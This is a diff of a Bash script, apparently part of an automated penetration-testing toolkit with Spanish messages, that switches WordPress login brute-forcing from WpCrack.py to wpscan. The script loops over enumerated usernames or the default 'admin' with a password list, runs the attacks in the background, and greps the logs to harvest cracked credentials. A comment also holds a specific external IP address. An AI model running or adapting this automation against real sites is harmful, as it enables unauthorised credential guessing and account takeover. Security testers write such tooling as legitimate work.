@@ -282,13 +282,16 @@ then
 					#https://181.115.188.36:443/				
 					for user in $(cat .vulnerabilidades2/"$host"_"$port-$path_web_sin_slash"_wpUsers.txt); do
 						echo -e "\t\t[+] Probando usuarios identificados. Probando con usuario ($user)"
-						echo "WpCrack.py -t $ip_port_path -u $user --p passwords-web.txt --thread 1" >> logs/cracking/"$host"_"$user"-"$port-$path_web_sin_slash"_passwordCMS.txt
-						WpCrack.py -t $ip_port_path -u $user --p passwords-web.txt --thread 1 >> logs/cracking/"$host"_"$user"-"$port-$path_web_sin_slash"_passwordCMS.txt 2>> logs/cracking/"$host"_"$user"-"$port-$path_web_sin_slash"_passwordCMS.txt &
+						echo "wpscan --url $ip_port_path --passwords passwords-web.txt --usernames $user" >> logs/cracking/"$host"_"$user"-"$port-$path_web_sin_slash"_passwordCMS.txt
+						#WpCrack.py -t $ip_port_path -u $user --p passwords-web.txt --thread 1 >> logs/cracking/"$host"_"$user"-"$port-$path_web_sin_slash"_passwordCMS.txt 2>> logs/cracking/"$host"_"$user"-"$port-$path_web_sin_slash"_passwordCMS.txt &
+						wpscan --url $ip_port_path --passwords passwords-web.txt --usernames $user >> logs/cracking/"$host"_"$user"-"$port-$path_web_sin_slash"_passwordCMS.txt  2>&1 &
+						sleep 10
 					done
 				else
 					echo -e "\t\t[+] Probando con usuario por defecto admin"	
-					echo "WpCrack.py -t $ip_port_path -u admin --p passwords-web.txt" >> logs/cracking/"$host"_"admin-$port"_passwordCMS.txt 2>/dev/null
-					WpCrack.py -t $ip_port_path -u admin --p passwords-web.txt --thread 1 >> logs/cracking/"$host"_"admin-$port"_passwordCMS.txt 2>/dev/null &
+					echo "wpscan --url $ip_port_path --passwords passwords-web.txt  --usernames admin" >> logs/cracking/"$host"_admin-"$port"-"$path_web_sin_slash"_passwordCMS.txt 2>/dev/null
+					#WpCrack.py -t $ip_port_path -u admin --p passwords-web.txt --thread 1 >> logs/cracking/"$host"_"admin-$port"_passwordCMS.txt 2>/dev/null &
+					wpscan --url $ip_port_path --passwords passwords-web.txt  --usernames admin >> logs/cracking/"$host"_admin-"$port"-"$path_web_sin_slash"_passwordCMS.txt  2>&1 &
 				fi						
 			fi			
 		fi	
@@ -1112,7 +1115,8 @@ then
 		fi
 
 		if [[ $fingerprint = *"wordpress"* ]]; then
-			grep --color=never -ia 'Credenciales' logs/cracking/"$host"_*_passwordCMS.txt 2>/dev/null  > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_passwordCMS.txt
+		
+			grep --color=never -ia 'Username' logs/cracking/"$host"_*-"$port"-"$path_web_sin_slash"_passwordCMS.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_passwordCMS.txt
 		fi
 
 		if [[ $fingerprint = *'tomcat admin'* ]]; then
